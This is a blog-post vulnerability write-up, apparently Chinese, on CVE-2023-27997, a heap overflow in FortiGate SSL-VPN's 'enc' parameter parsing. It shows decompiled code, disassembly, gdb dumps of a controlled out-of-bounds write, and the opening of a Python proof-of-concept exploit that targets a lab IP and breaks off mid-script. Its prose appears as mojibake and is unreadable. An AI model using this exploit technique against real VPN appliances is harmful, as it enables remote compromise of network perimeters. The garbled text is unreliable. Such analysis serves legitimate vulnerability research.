                <time title="Modified: 2023-12-02 23:37:08" itemprop="dateModified" datetime="2023-12-02T23:37:08+08:00">2023-12-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å¤ç°å®Œ <strong>CVE-2022-42475</strong>ä¹‹åï¼Œä¾¿å…³æ³¨åˆ°äº†æ­¤æ¼æ´ã€‚è¿™æ˜¯ä¸€ä¸ªç”±äºè¾¹ç•Œå¤§å°åˆ¤æ–­ä¸å½“ï¼Œä»è€Œå¯¼è‡´çš„ä¸€ä¸ªå †ä¸Šè¶Šç•Œå†™çš„æ¼æ´ï¼Œå¯å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ç”±äºç¬”è€…çš„é€†å‘èƒ½åŠ›ä¸æ˜¯å¾ˆå¥½ï¼Œæœ¬æ¼æ´ä¹Ÿæ˜¯è·Ÿç€å…¶ä»–å¸ˆå‚…çš„åšå®¢å¤ç°è€Œæˆï¼Œå¦‚æœæœ¬æ–‡ä¸­çš„æè¿°æœ‰ä»€ä¹ˆä¸å‡†ç¡®çš„åœ°æ–¹ï¼Œè¿˜è¯·å„ä½å¸ˆå‚…æµ·æ¶µã€‚</p>
<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ¼æ´å‡ºç°åœ¨ <strong>sslvpn</strong>å¯¹ <strong>enc</strong>å‚æ•°å¤„ç†çš„å‡½æ•°ä¸­ï¼Œè¿™é‡ŒæŠŠä»–é‡å‘½åä¸º <strong>parse_enc_data</strong>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v22 = find_header(*(_QWORD *)(v11 + <span class="number">744</span>), (<span class="type">const</span> <span class="type">char</span> *)&amp;byte_3347915);</span><br><span class="line">  <span class="keyword">if</span> ( v22 &amp;&amp; (<span class="type">int</span>)parse_enc_data(v11, a1, v22) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    log___(v11, <span class="number">8LL</span>, (__int64)<span class="string">&quot;could not decode &#x27;enc&#x27; data properly.&quot;</span>);</span><br><span class="line">    v16 = <span class="number">4100</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">    <span class="keyword">if</span> ( *((__int64 *)v19 + <span class="number">405</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      sub_16FD7E0(*a1, v19 + <span class="number">3240</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(v97, <span class="string">&quot;/remote/error?msg=%d&quot;</span>, v16);</span><br><span class="line"></span><br><span class="line">.rodata:<span class="number">0000000003347915</span> <span class="number">65</span>                      byte_3347915    db <span class="string">&#x27;e&#x27;</span>                  ; DATA XREF: sub_1729160+<span class="number">6F</span>â†‘o .rodata:<span class="number">0000000003347915</span>                                                                 ; sub_17300E0+<span class="number">1B</span>7â†‘o ...</span><br><span class="line">.rodata:<span class="number">0000000003347916</span> <span class="number">6</span>E                                      db <span class="string">&#x27;n&#x27;</span></span><br><span class="line">.rodata:<span class="number">0000000003347917</span> <span class="number">63</span>                                      db <span class="string">&#x27;c&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å‡½æ•°ä¸­ï¼Œå…ˆæ˜¯åˆ¤æ–­äº† <strong>enc</strong>çš„é•¿åº¦æ˜¯å¦å¤§äº <strong>11</strong>å¹¶ä¸”æ˜¯å¦æ˜¯å¶æ•°ã€‚å¦‚æœ <strong>enc</strong>çš„é•¿åº¦å¤§äº <strong>11</strong>å¹¶ä¸”æ˜¯å¶æ•°æ‰ä¼šè¿›è¡Œæ¥ä¸‹æ¥è¿›ä¸€æ­¥çš„å¤„ç†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">parse_enc_data</span><span class="params">(__int64 a1, __int64 *pool, <span class="type">const</span> <span class="type">char</span> *enc)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(enc);</span><br><span class="line">  enc_raw_len = v4;</span><br><span class="line">  v19 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">11</span> || (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    log___(a1, <span class="number">8LL</span>, (__int64)<span class="string">&quot;enc data length invalid (%d)\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€æ˜¯ç”¨ <strong>md5</strong>å¯¹å¯†é’¥æµè¿›è¡Œåˆå§‹åŒ–ã€‚å…¶ä¸­ <strong>salt</strong>ç”±æœåŠ¡å™¨äº§ç”Ÿï¼Œå¯é€šè¿‡è¯·æ±‚ <strong>&#x2F;remote&#x2F;info</strong>è·å–åˆ°å®ƒçš„å€¼ï¼Œ<strong>enc</strong>çš„å‰å…«ä¸ªå­—èŠ‚ç”±æˆ‘ä»¬æ§åˆ¶ï¼Œè¿˜æœ‰ä¸€ä¸ªå›ºå®šçš„å­—ç¬¦ä¸²ã€‚æ¥ç€æ ¹æ® <strong>(enc_raw_len &gt;&gt; 1) + 1</strong> åˆ†é…ç¼“å†²åŒºã€‚å¹¶å¯¹ <strong>enc</strong>ä¼ å…¥çš„æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¹¶èµ‹å€¼åˆ°åˆ†é…çš„å †ä¸Šã€‚å…·ä½“å¤„ç†æ–¹å¼å°±æ˜¯å°†åŸæ¥ä¼ è¿›æ¥çš„å­—ç¬¦ä¸²ï¼Œä»¥ä¸¤ä¸ªå­—èŠ‚çš„ <strong>ascii</strong>ç çœ‹æˆä¸€ä¸ªæ–°çš„å­—èŠ‚ã€‚æ¯”å¦‚ä¼ è¿›æ¥çš„æ˜¯ <strong>010203040506abcdefgh</strong>å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±ä¼šè½¬ä¸º <strong>\x01\x02\x03\x04\x05\x06\xab\xcd\xef\xgh</strong>å‚¨å­˜åˆ°å †ä¸Šï¼Œå¹¶åœ¨æœ«å°¾ç½®é›¶ã€‚è¿™å¤§æ¦‚ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¹‹å‰åˆ†é…ç©ºé—´æ—¶ï¼Œä»¥è¾“å…¥é•¿åº¦çš„ <strong>1&#x2F;2</strong>è¿›è¡Œåˆ†é…çš„åŸå› ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">sub_17318E0(salt, (__int64)enc, <span class="number">8</span>, (__int64)md5);</span><br><span class="line">ptr = (<span class="type">const</span> <span class="type">char</span> *)sub_16D1AC0(*pool, (enc_raw_len &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ( ptr )</span><br><span class="line">&#123;</span><br><span class="line">v5 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v6 = sub_175BD40(enc[<span class="number">2</span> * v5]);</span><br><span class="line">  ptr[v5] = sub_175BD40(enc[<span class="number">2</span> * v5 + <span class="number">1</span>]) + <span class="number">16</span> * v6;</span><br><span class="line">  ++v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v19 &gt; <span class="number">2</span> * (<span class="type">int</span>)v5 );</span><br><span class="line">v7 = ((<span class="type">unsigned</span> <span class="type">int</span>)(enc_raw_len - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( enc_raw_len &lt;= <span class="number">0</span> )</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">ptr[v7] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_17318E0</span><span class="params">(<span class="type">char</span> *salt, __int64 enc, <span class="type">int</span> len, __int64 md5)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  MD5_Init(v8);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(salt);</span><br><span class="line">  MD5_Update((__int64)v8, (__int64)salt, v6);</span><br><span class="line">  MD5_Update((__int64)v8, enc, len);</span><br><span class="line">  MD5_Update((__int64)v8, (__int64)<span class="string">&quot;GCC is the GNU Compiler Collection.&quot;</span>, <span class="number">35LL</span>);</span><br><span class="line">  MD5_Final(md5, (__int64)v8);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(gdb) x/s <span class="number">0x7f20df4decf8</span></span><br><span class="line"><span class="number">0x7f20df4decf8</span>: <span class="string">&quot;010203040506abcdefgh&quot;</span></span><br><span class="line">(gdb) x/<span class="number">20b</span>x <span class="number">0x7f20df4decf8</span></span><br><span class="line"><span class="number">0x7f20df4decf8</span>: <span class="number">0x30</span>    <span class="number">0x31</span>    <span class="number">0x30</span>    <span class="number">0x32</span>    <span class="number">0x30</span>    <span class="number">0x33</span>    <span class="number">0x30</span>    <span class="number">0x34</span></span><br><span class="line"><span class="number">0x7f20df4ded00</span>: <span class="number">0x30</span>    <span class="number">0x35</span>    <span class="number">0x30</span>    <span class="number">0x36</span>    <span class="number">0x61</span>    <span class="number">0x62</span>    <span class="number">0x63</span>    <span class="number">0x64</span></span><br><span class="line"><span class="number">0x7f20df4ded08</span>: <span class="number">0x65</span>    <span class="number">0x66</span>    <span class="number">0x67</span>    <span class="number">0x68</span></span><br><span class="line"></span><br><span class="line">(gdb) x/<span class="number">20b</span>x <span class="number">0x7f20df4ded10</span></span><br><span class="line"><span class="number">0x7f20df4ded10</span>: <span class="number">0x01</span>    <span class="number">0x02</span>    <span class="number">0x03</span>    <span class="number">0x04</span>    <span class="number">0x05</span>    <span class="number">0x06</span>    <span class="number">0xab</span>    <span class="number">0xcd</span></span><br><span class="line"><span class="number">0x7f20df4ded18</span>: <span class="number">0xef</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥è§£å¯†éƒ¨åˆ†çš„ä¼ªä»£ç æˆ‘æ„Ÿè§‰æ˜¯IDAåç¼–è¯‘æœ‰é—®é¢˜ï¼ˆæˆ–è€…æ˜¯ç¬”è€…é€†å‘åŠŸåº•ä¸å¤Ÿï¼‰ã€‚æ ¹æ®æ±‡ç¼–ï¼Œç¬”è€…è®¤ä¸ºä¸‰å¤„åŠ äº†æ³¨é‡Šçš„åœ°æ–¹å‡æœ‰é—®é¢˜ï¼Œæ­£ç¡®çš„ä¼ªä»£ç åº”è¯¥å¦‚æ³¨é‡Šæ‰€ç¤ºã€‚ä¹Ÿå°±æ˜¯<strong>enc_raw_len-5</strong>ä¸ <strong>real_size</strong>è¿›è¡Œæ¯”è¾ƒã€‚åˆ¤æ–­çš„æ˜¯ <strong>raw_size</strong>ç»è¿‡ <strong>xor</strong>ä¹‹åå¾—åˆ°çš„ <strong>real_size</strong>æ˜¯å¦å­˜åœ¨ã€‚å¹¶ä¸”å¾ªç¯æ¬¡æ•°æ˜¯ <strong>real_size - 1</strong>ã€‚æ‰€ä»¥è¿™é‡Œå°±ä¼šå­˜åœ¨ä¸€ä¸ªå †æº¢å‡ºã€‚å› ä¸ºæ˜¯é€šè¿‡**(enc_raw_len &gt;&gt; 1) + 1<strong>åˆ†é…çš„å †ç©ºé—´ï¼Œè€Œè§£å¯†çš„å¾ªç¯æ¬¡æ•°ï¼ˆ</strong>real_size<strong>ï¼‰åˆ™å¯ä»¥å®Œå…¨è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œå¹¶ä¸”åªè¦æ»¡è¶³</strong>enc_raw_len-5&gt;real_size<strong>å³å¯ã€‚ä¹Ÿå°±æ˜¯åªè¦æ»¡è¶³</strong>(enc_raw_len &gt;&gt; 1) + 1&lt;real_size&lt;enc_raw_len-5**ï¼Œå°±å¯ä»¥å®ç°å †ä¸Šè¶Šç•Œå†™ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">raw_size = *((_WORD *)v8 + <span class="number">2</span>);</span><br><span class="line">real_size = (<span class="type">unsigned</span> __int8)(raw_size ^ md5[<span class="number">0</span>]);</span><br><span class="line">BYTE1(real_size) = md5[<span class="number">1</span>] ^ HIBYTE(raw_size);</span><br><span class="line"><span class="keyword">if</span>(enc_raw_len - <span class="number">5</span> &lt;= (<span class="type">unsigned</span> __int8)(raw_size ^ md5[<span class="number">0</span>]) ) <span class="comment">//enc_raw_len-5&lt;=real_size</span></span><br><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">data_ptr = v8 + <span class="number">6</span>;</span><br><span class="line">ptr = data_ptr;</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)raw_size != md5[<span class="number">0</span>] ) <span class="comment">// if (real_size)</span></span><br><span class="line">&#123;</span><br><span class="line">  real_size_1 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)(raw_size ^ md5[<span class="number">0</span>]) - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// real_size_1 = real_size - 1;</span></span><br><span class="line">  cnt = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      data_ptr[cnt] ^= md5[v15]; <span class="comment">// bof</span></span><br><span class="line">      <span class="keyword">if</span> ( real_size_1 == cnt )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v15 = ((_BYTE)cnt + <span class="number">3</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)cnt + <span class="number">3</span>) &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v20 = real_size;</span><br><span class="line">        MD5_Init(v23);</span><br><span class="line">        MD5_Update((__int64)v23, (__int64)md5, <span class="number">16LL</span>);</span><br><span class="line">        MD5_Final((__int64)md5, (__int64)v23);</span><br><span class="line">        real_size = v20;</span><br><span class="line">      &#125;</span><br><span class="line">      data_ptr = ptr;</span><br><span class="line">      ++cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    data_ptr = &amp;ptr[(<span class="type">unsigned</span> __int16)real_size];</span><br><span class="line">&#125;</span><br><span class="line">*data_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000001731714</span> <span class="number">48</span> <span class="number">83</span> C2 <span class="number">06</span>                             add     rdx, <span class="number">6</span></span><br><span class="line">.text:<span class="number">0000000001731718</span> <span class="number">48</span> <span class="number">89</span> <span class="number">95</span> <span class="number">40</span> FF FF FF                    mov     [rbp+ptr], rdx</span><br><span class="line">.text:<span class="number">000000000173171F</span> <span class="number">45</span> <span class="number">85</span> C0                                test    r8d, r8d</span><br><span class="line">.text:<span class="number">0000000001731722</span> <span class="number">0F</span> <span class="number">84</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                       jz      loc_17317AF</span><br><span class="line">.text:<span class="number">0000000001731728</span> <span class="number">45</span> <span class="number">8</span>D <span class="number">68</span> FF                             lea     r13d, [r8<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>è¿™é‡Œçš„å¼‚æˆ–ä¼šå¯¼è‡´å‰é¢çš„æ•°æ®è¢«æ±¡æŸ“ï¼ŒåŒæ—¶åŸä½œè€…ä¹Ÿæä¾›äº†ä¸€ç§å¾ˆå¥½çš„æ€è·¯ã€‚å³åˆ©ç”¨äºŒæ¬¡å¼‚æˆ–å€¼ä¸å˜çš„ç‰¹æ€§ï¼ŒåŠ ä¸Šæœ«å°¾ç½®é›¶çš„ç‰¹æ€§ï¼Œæ¥å®ç°å‘åè¶Šç•Œå†™ä»»æ„æ•°æ®ã€‚ä½œè€…ç»™å‡ºçš„ä¾‹å­æ˜¯åœ¨æº¢å‡ºåç§»ä¸º <strong>5000</strong>çš„ä½ç½®ä¸Šå†™ <strong>\x50</strong>ã€‚è®¡ç®—å‡ºæ‰€éœ€çš„ <strong>seed</strong>åã€‚ç¬¬ä¸€æ¬¡æ¥å®ç°æœ«å°¾ç½®é›¶ï¼Œç¬¬äºŒæ¬¡æ¢å¤å‰é¢æ•°æ®çš„åŒæ—¶ï¼Œä¹ŸæˆåŠŸæŠŠåç§»ä¸º <strong>5000</strong>çš„åœ°æ–¹æ”¹æˆäº† <strong>\x50</strong>ã€‚</p>
<p><img src="/img/CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow/1.png"></p>
<p>æˆ‘åˆ©ç”¨è¯¥æ€è·¯ï¼Œå°è¯•æŠŠæº¢å‡ºåç§»ä¸º <strong>0x10</strong>çš„å€¼æ”¹ä¸º <strong>0xaa</strong>ã€‚æˆ‘ç”³è¯·çš„å †å—å¤§å°ä¸º <strong>0xfe8</strong>ï¼Œæº¢å‡ºåç§»ä¸º <strong>0x10</strong>å¤„åº”è¯¥æ˜¯ <strong>0x7f20de80a010</strong>ï¼Œå¯ä»¥å‘ç°è¢«æˆåŠŸä¿®æ”¹ä¸º <strong>0xaa</strong>ã€‚æ¥ç€å¾ªç¯åˆ©ç”¨æ­¤æ–¹å¼ï¼Œå³å¯å®ç°å†™ä»»æ„é•¿åº¦æ•°æ®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r rsi</span><br><span class="line">rsi            0xfe8    4072</span><br><span class="line">(gdb) ni</span><br><span class="line">0x000000000173164e in ?? ()</span><br><span class="line">(gdb) i r rax</span><br><span class="line">rax            0x7f20de809018   139779148648472</span><br><span class="line">(gdb) x/10gx 0x7f20de809018</span><br><span class="line">0x7f20de809018: 0x565f15f46de5e4e9      0xd60a439f3f849e41</span><br><span class="line">0x7f20de809028: 0x8e8abb7027401e05      0xcf46b2988c0117ee</span><br><span class="line">0x7f20de809038: 0x772fe4c73b4664a1      0xb1087fe34b7b5a7b</span><br><span class="line">0x7f20de809048: 0x90ac9ccd1e18d43f      0xbc94283552ba72f5</span><br><span class="line">0x7f20de809058: 0x35d4acf803fde83a      0x913d36fe9630a124</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">(gdb) x/10gx 0x7f20de809018+0xfe8</span><br><span class="line">0x7f20de80a000: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f20de80a010: 0x00000000000000aa      0x0000000000000000</span><br><span class="line">0x7f20de80a020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f20de80a030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f20de80a040: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>å‰©ä¸‹çš„åˆ™æ˜¯å¦‚ä½•æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œè¿™ä¸ä¹‹å‰å†™è¿‡çš„<strong>CVE-2022-42475</strong>å¤§åŒå°å¼‚ï¼Œåœ¨æ­¤åˆ™ä¸è¿‡å¤šå™è¿°ã€‚æœ€åç»™å‡ºå†™ä¸€å­—èŠ‚çš„ <strong>poc</strong>ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IP = <span class="string">&quot;192.168.229.163&quot;</span></span><br><span class="line">PORT = <span class="number">4443</span></span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">&quot;&lt;I&quot;</span>, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ssl_socket</span>(<span class="params">_ip, _port</span>):</span><br><span class="line">    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    _socket.connect((_ip, _port))</span><br><span class="line">    _context = ssl._create_unverified_context()</span><br><span class="line">    _ssl_socket = _context.wrap_socket(_socket)</span><br><span class="line">    <span class="keyword">return</span> _ssl_socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Expliot</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, _ip, _port</span>):</span><br><span class="line">        self.ip = _ip</span><br><span class="line">        self.port = _port</span><br><span class="line">        self.salt = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_salt</span>(<span class="params">self, _socket</span>):</span><br><span class="line">        _request = <span class="string">&quot;&quot;&quot;GET /remote/info HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n&quot;&quot;&quot;</span> % (self.ip, self.port)</span><br><span class="line">        _socket.sendall(_request.encode())</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;salt&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> (salt := _socket.recv(<span class="number">1024</span>)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Get salt fault&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        self.salt = salt[salt.find(<span class="string">b&quot;salt&quot;</span>)+<span class="number">6</span>:salt.find(<span class="string">b&quot;salt&quot;</span>)+<span class="number">14</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc_packet_data_size</span>(<span class="params">self, _size</span>):</span><br><span class="line">        self.BLOCK_HEAD = <span class="number">0x18</span></span><br><span class="line">        self.PACKET_SIZE = _size</span><br><span class="line">        self.DISTANCE = self.PACKET_SIZE - self.BLOCK_HEAD - <span class="number">6</span></span><br><span class="line">        alloc_size = self.PACKET_SIZE</span><br><span class="line">        alloc_size -= self.BLOCK_HEAD</span><br><span class="line">        <span class="comment"># target = (inlen &gt;&gt; 1) + 1</span></span><br><span class="line">        inlen = (alloc_size - <span class="number">1</span>) &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># inlen consists of a header of size 12 followed by the data in hexa</span></span><br><span class="line">        inlen_data = inlen - <span class="number">12</span></span><br><span class="line">        inlen_unhex = inlen_data &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        self.packet_data_size = inlen_unhex</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc_md5</span>(<span class="params">self, _seed</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(_seed) == <span class="number">8</span></span><br><span class="line"></span><br><span 